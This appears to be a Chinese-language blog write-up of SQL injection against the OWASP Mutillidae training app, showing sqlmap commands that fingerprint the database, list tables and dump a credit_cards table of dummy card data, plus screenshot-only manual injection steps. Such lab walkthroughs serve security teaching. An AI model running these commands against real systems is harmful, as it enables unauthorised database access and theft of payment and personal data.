---
title: Mutillidae SQL Injection
date: 2020-12-28 11:01:48
categories: mutillidae
tags: 
- sql
---

## 使用 SQLMap

### 截断请求数据包

使用 BurpSuite 截断 User Info 数据包, 另存为请求数据文件, 命名为 `1.request`

![owasp-2017-a1-injection-sql4](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/mutillidae/owasp-2017-a1-injection-sql4.jpg)

### 获取数据库系统信息

```shell
python sqlmap.py -r 1.request -b
  ...
  [14:54:06] [INFO] the back-end DBMS is MySQL
  [14:54:06] [INFO] fetching banner
  back-end DBMS: MySQL 5 (MariaDB fork)
  banner: '10.3.17-MariaDB'
  ...
```

<!-- more -->

### 获取数据库信息

```shell
python sqlmap.py -r 1.request -p username --dbms=MySQL --dbs
  ...
  available databases [2]:
  [*] information_schema
  [*] mutillidae
  ...
```

### 获取数据库中的表

```shell
python sqlmap.py -r .\1.request -p username --dbms=MySQL -D mutillidae --tables
  ...
  Database: mutillidae
  [12 tables]
  +----------------------------+
  | accounts                   |
  | blogs_table                |
  | captured_data              |
  | credit_cards               |
  | help_texts                 |
  | hitlog                     |
  | level_1_help_include_files |
  | page_help                  |
  | page_hints                 |
  | pen_test_tools             |
  | user_poll_results          |
  | youTubeVideos              |
  +----------------------------+
  ...
```

### 查看数据表列名

```shell
python sqlmap.py -r 1.request -p username --dbms=MySQL -D mutillidae -T credit_cards --columns
  ...
  Database: mutillidae
  Table: credit_cards
  [4 columns]
  +------------+---------+
  | Column     | Type    |
  +------------+---------+
  | ccid       | int(11) |
  | ccnumber   | text    |
  | ccv        | text    |
  | expiration | date    |
  +------------+---------+
  ...
```

### 获取表内容

```shell
python sqlmap.py -r 1.request -p username --dbms=MySQL -D mutillidae -T credit_cards --columns --dump
  ...
  Database: mutillidae
  Table: credit_cards
  [5 entries]
  +------+-----+------------------+------------+
  | ccid | ccv | ccnumber         | expiration |
  +------+-----+------------------+------------+
  | 1    | 745 | 4444111122223333 | 2012-03-01 |
  | 2    | 722 | 7746536337776330 | 2015-04-01 |
  | 3    | 461 | 8242325748474749 | 2016-03-01 |
  | 4    | 230 | 7725653200487633 | 2017-06-01 |
  | 5    | 627 | 1234567812345678 | 2018-11-01 |
  +------+-----+------------------+------------+
  ...
```

### 获取特定列内容

```shell
python sqlmap.py -r 1.request -p username --dbms=MySQL -D mutillidae -T credit_cards --columns -C ccid,ccnumber --dump
  ...
  Database: mutillidae
  Table: credit_cards
  [5 entries]
  +------+------------------+
  | ccid | ccnumber         |
  +------+------------------+
  | 1    | 4444111122223333 |
  | 2    | 7746536337776330 |
  | 3    | 8242325748474749 |
  | 4    | 7725653200487633 |
  | 5    | 1234567812345678 |
  +------+------------------+
  ...
```

## 手动测试

### 使用不存在的用户名 `testuser` 登陆

![owasp-2017-a1-injection-sql1](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/mutillidae/owasp-2017-a1-injection-sql1.jpg)

### 使用 `testuser'` 查看报错信息 

![owasp-2017-a1-injection-sql2](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/mutillidae/owasp-2017-a1-injection-sql2.jpg)

### 截断并修改 sql 语句获得用户信息

![owasp-2017-a1-injection-sql3](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/mutillidae/owasp-2017-a1-injection-sql3.jpg)
